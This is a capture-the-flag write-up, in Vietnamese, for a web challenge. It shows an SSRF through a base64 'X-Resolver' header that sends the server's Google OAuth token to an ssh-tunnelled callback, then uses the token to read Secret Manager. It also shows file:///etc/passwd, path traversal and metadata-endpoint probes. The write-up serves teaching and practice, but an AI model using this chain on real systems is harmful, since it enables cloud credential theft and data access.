# Cloudy with a Chance of Spaceships — Web (67 pts)

**Flag:** `CSSCTF{your_forecast_says_love_is_on_its_way}` · **Files:** không có artifact, dữ liệu lấy từ service đang chạy (`files/index.html` 1827 B, `files/2.CftUi-UM.js` 5694 B sha256 `2cc74b92…b97e173`)

## Đề bài

Một trang SvelteKit liệt kê năm con tàu và nhận "lấy nhiệt độ thân tàu" khi bấm nút. Đề
không cho file, chỉ cho URL `http://34.116.80.78:9143/` và câu gợi ý "What's your forecast
looking like?". Mục tiêu là lấy cờ `CSSCTF{...}`.

Không có ô nhập liệu: mọi tương tác là một nút gọi
`/api/v1/ship/<tên>/temperature` rồi in ra một con số.

## Phân tích ban đầu

`GET /` trả `x-sveltekit-page: true` và header `link:` liệt kê toàn bộ bundle. Route không
xuất hiện trong HTML (data server-render là `null`), nên phải đọc `_app/immutable/nodes/2.CftUi-UM.js`,
nơi chứa cả hai mảnh thông tin:

```js
async function T(a,t,e){const r=a.currentTarget.textContent;ot(t,{ship:r},!0),
  C(t).temp=await(await fetch(`/api/v1/ship/${encodeURIComponent(r)}/temperature`,
    {headers:{"X-Resolver":e}})).text()}
const e="XeyJyZXNvbHZlciI6Imh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1NwYWNlX3dlYXRoZXIifQ==";
```

`e` là hằng dựng sẵn trong bundle. Chuỗi sau ký tự `X` đầu tiên là base64 của
`{"resolver":"https://en.wikipedia.org/wiki/Space_weather"}`, tức header được đóng gói dạng
`"X" + base64(json)` và JSON đó chỉ có một key `resolver`.

Thử trực tiếp cho thấy server lấy URL từ trong header rồi tự đi fetch
(`analysis/resolver_probe.log`):

```text
thieu header                    : HTTP 451 body=
khong phai base64               : HTTP 451 body=
base64 thieu key resolver       : HTTP 451 body=
wikipedia Space_weather         : HTTP 200 body=3604.6
example.com https               : HTTP 200 body=71.3
example.com http                : HTTP 200 body=71.3
1.1.1.1 http                    : HTTP 200 body=5661.4
1.1.1.1 https                   : HTTP 200 body=5661.4
8.8.8.8 (khong co HTTP)         : err TimeoutError
127.0.0.1                       : HTTP 500 body=<!doctype html>
```

Ba tính chất định hình phần còn lại:

- Con số đổi theo URL, không đổi theo tên tàu. Cùng một resolver cho cả năm tàu trên board,
  cho một tàu bịa (`Zhiping`), đều ra `71.3` (`analysis/temperature_probe.log`).
  `encodeURIComponent` ở client chỉ là che ký tự, không phải tham số của phép tính.
- `http` và `https` cho cùng trang ra cùng số, nên giao thức không phải dữ liệu.
- Không có header thì 451, kể cả khi header sai cú pháp: bài không có giá trị mặc định,
  `resolver` luôn do người gọi quyết.

## Các hướng đã loại

Trước khi chốt đã kiểm tra và loại các kênh sau (log đầy đủ ở `notes.md`):

1. **Model con số nhiệt độ thành digest của nội dung**: đã tính `md5/sha1/sha256/sha512` của
   body tải về local rồi thử các phép `% 600000`, `% 720` so với ba số đã đo; không tổ hợp nào
   khớp (`analysis/temperature_model.log`). Hai trường hợp khớp độ dài đơn thuần là trùng
   hợp hình thức: `example.com` 713 B cho `71.3` và `1.1.1.1` 56614 B cho `5661.4`, nhưng
   Wikipedia tải local 515963 B trong khi server báo `3604.6`, tức thân bài mà server đọc
   không phải số byte ta có. Một hàm băm trên dữ liệu không tái tạo được thì không dùng gì
   được. Loại.
2. **Đọc file cục bộ qua `file:///etc/passwd`, và loopback `127.0.0.1`/`localhost`/`[::1]`**:
   cả bốn trả HTTP 500 với trang lỗi SvelteKit `Internal Error` (`files/error_127.html`).
   Cùng cú pháp 500 này xuất hiện khi port loopback không có dịch vụ nào nghe
   (`http://127.0.0.1:1/`, `:9`, `:65500` trong `analysis/refute_length_model.log`), nên
   đây là nhánh fetch thất bại, không phải một primitive "URL bị chặn". Loại làm hướng đọc
   file, và cũng vì đọc nó mà phiên đầu kết luận sai là SSRF đã bị khoá.
3. **Path traversal ở tên tàu**: `GET /api/v1/ship/../../../etc/passwd/temperature` trả 404,
   route không nối chuỗi thô. Loại.
4. **Tìm thêm route** (`/api/v1/ship`, `/api/v1/fleet`, `.map`, `/api/v1/.../readings`,
   `/api/v1/.../logs`, `/api/v1/ships`, `/api/v1/ships/all`, `/api/v1/secret`, `/flag`):
   toàn bộ trả `404:Not Found`. Bundle chỉ chứa đúng một lệnh `fetch`, và không có `.map`
   nào được nhúng vào HTML server-render (`data: [null,null]`), nên không còn đường nào khác
   ngoài header. Loại.
5. **Đoán flag từ nhiệt độ hoặc từ văn bản trang**: trang chỉ có năm tên tàu, không chuỗi
   `CSSCTF{`, và con số không phụ thuộc tàu. Loại.

Còn một kênh không loại được nhưng không cần: `http://169.254.169.254/` và
`http://metadata.google.internal/` thực ra trả HTTP 200 (xem `analysis/metadata_probe.log`),
tức liên kết cục bộ metadata không bị chặn. Nó chỉ cho độ dài thân bài, mà độ dài thì không
đọc ra nội dung; request đi ra đã mang sẵn credential nên không cần ngỏ tới metadata.

## Chuỗi khai thác

**Bước 1 - Đóng gói header theo đúng format của bundle.** `X` cộng base64 của JSON một key
`resolver`; giữ nguyên tiền tố `X` vì server kiểm cú pháp chuỗi này:

```python
def resolver_header(url):
    return "X" + base64.b64encode(json.dumps({"resolver": url}).encode()).decode()
```

**Bước 2 - Chứng minh server đi fetch hộ mình.** Đứng ngoài không nhìn thấy gì, nên cần một
callback công khai. Máy này không có `ngrok`/`cloudflared`, nhưng `ssh` của Git Bash đủ:

```bash
python analysis/catch_auth.py 8911
ssh -R 80:localhost:8911 serveo.net
```

Serveo in ra `https://b838ca5ccee1ee4e-42-118-254-242.serveousercontent.com`; `catch_auth.py`
ghi JSON một dòng mỗi request vào `analysis/auth.log` và trả thân bài ngẫu nhiên
(`CLOUDY-<epoch>`) để con số đổi theo từng lần, xác nhận nội dung được đọc thật.
`exploit.py` bắn `/api/v1/ship/Cassini/temperature` với resolver trỏ về callback:

```text
[+] SSRF HTTP 200 temperature='2.4'
```

**Bước 3 - Lấy credential trong request đi ra.** Serveo giữ nguyên header do client gửi tới,
chỉ thêm `x-forwarded-*`, nên header dưới đây đúng là những gì app phát đi (`analysis/capture.log`,
token đã cắt). Đường dẫn ghi trong log là `/`: serveo khớp route theo Host nên mọi path đều
được gọi tới gốc listener.

```text
=== 2026-10-01T09:25:42+00:00 GET /
    {
  "authorization": "Bearer ya29.c.c0AZ4...<1012 ky tu da cat>...d803yu",
  "user-agent": "node-fetch/1.0 (+https://github.com/bitinn/node-fetch)",
  "accept-encoding": "gzip,deflate",
  "x-real-ip": "34.116.80.78"
}
```

Ba request liên tiếp trong vòng một phút mang cùng một chuỗi, tức token được cache chứ không
mint per-request; hai phiên cách nhau ~20 phút cho hai chuỗi khác nhau, và `expires_in` phiên
sau là 3363 giây.

**Bước 4 - Xác thực token.** `oauth2.googleapis.com/tokeninfo` nhận nó, nghĩa là đây là OAuth
access token thật của Google, không phải chuỗi giả tác giả đặt vào:

```text
[+] tokeninfo HTTP 200 scope=https://www.googleapis.com/auth/cloud-platform exp=1790850141 expires_in=3333
```

**Bước 5 - Định vị project.** `cloudresourcemanager` chưa bật nên 403, nhưng chính lỗi đó in
ra project number; `storage` thì gọi được và 403 của nó ghi thẳng danh tính service account
kèm project id:

```text
[+] HTTP 403 lo project number 613713115850
[+] 403 cua storage go ra danh tinh meteorologist@css-ctf-2026.iam.gserviceaccount.com va project id css-ctf-2026
```

Cái tên `meteorologist` (nhà khí tượng) khớp đúng vai mà đề gán: người dự báo thời tiết của
đội tàu.

**Bước 6 - Đọc Secret Manager.** Với scope `cloud-platform`, `secretmanager` trả lời; cả project
chỉ có một secret, một version, và `:access` cho ra cờ:

```text
[+] secretmanager HTTP 200 totalSize=1 secrets=['goog_encryption_secret']
[+] goog_encryption_secret@1 (45 ky tu) = CSSCTF{your_forecast_says_love_is_on_its_way}
```

**Bước kiểm chứng.** Token được dùng nguyên trạng qua đường hầm riêng, không có giá trị nào
được điền tay vào script; `exploit.py` chỉ exit 0 khi một payload giải mã ra chuỗi bắt đầu
bằng `CSSCTF{`, và nó ghi `flag.txt` từ chính chuỗi đó. Chuỗi 45 ký tự in được hoàn toàn,
đúng định dạng `CSSCTF{...}` của giải, và thân chuỗi là câu trả lời cho chính gợi ý của thẻ
("What's your forecast looking like?"). Chạy lại từ đầu tới cuối cho cùng một cờ ba lần (16:25:42,
16:26:16 và 16:26:46) với ba token khác nhau, đều đọc từ callback vừa hứng.

## Flag

```bash
python exploit.py https://<hash>-<ip>.serveousercontent.com
```

```text
[+] http://34.116.80.78:9143/ HTTP 200 title='Cloudy with a Chance of Spaceships'
[+] SSRF HTTP 200 temperature='2.4'
[+] doc token tu auth.log: 3 ban, dung ban cuoi (1024 ky tu)
[+] tokeninfo HTTP 200 scope=https://www.googleapis.com/auth/cloud-platform exp=1790850141 expires_in=3333
[+] HTTP 403 lo project number 613713115850
[+] 403 cua storage go ra danh tinh meteorologist@css-ctf-2026.iam.gserviceaccount.com va project id css-ctf-2026
[+] secretmanager HTTP 200 totalSize=1 secrets=['goog_encryption_secret']
[+] goog_encryption_secret@1 (45 ky tu) = CSSCTF{your_forecast_says_love_is_on_its_way}
[+] da luu flag.txt
```

## Reproduce

```bash
python analysis/catch_auth.py 8911 &
ssh -R 80:localhost:8911 serveo.net        # copy URL nó in ra
python exploit.py <url-vừa-copy>
```

```bash
CTF_TOKEN=ya29.moi python exploit.py       # nếu đã có token, bỏ qua SSRF
```

```bash
python analysis/bundle_route.py            # route + literal header trong bundle
python analysis/resolver_probe.py          # 451 / 200 / 500 theo loại URL
python analysis/temperature_probe.py       # số không phụ thuộc tên tàu
python analysis/temperature_model.py       # phép model digest đã loại
python analysis/metadata_probe.py          # metadata link-local vẫn 200
```

Token nằm trong `analysis/auth.log` do listener ghi tại máy chạy script; file này bị
`.gitignore`, bản dựng lại chỉ có `analysis/capture.log` với chuỗi đã cắt.
